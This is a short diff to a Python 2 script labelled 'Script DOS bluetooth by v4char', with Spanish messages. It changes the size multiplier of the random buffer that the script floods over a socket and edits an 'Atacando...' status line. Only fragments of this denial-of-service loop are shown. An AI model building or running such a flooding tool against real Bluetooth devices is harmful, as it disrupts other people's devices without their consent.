@@ -9,7 +9,7 @@ import threading
 import random
 import string
 
-caracteres = 750
+caracteres = 16
 
 print "\n\nScript DOS bluetooth by v4char"
 print "Se paciente puede tardar un poco"
@@ -48,7 +48,7 @@ if len(sys.argv) >= 3:
             buff = (generar(8).decode("hex"))*caracteres
             s.send(buff)
             s.close
-            print "Atacando...\nCaracteres: "+str(caracteres)
+            print "Atacando...\n"
             main(int(sys.argv[2]))
          except:
             caracteres = caracteres - 1
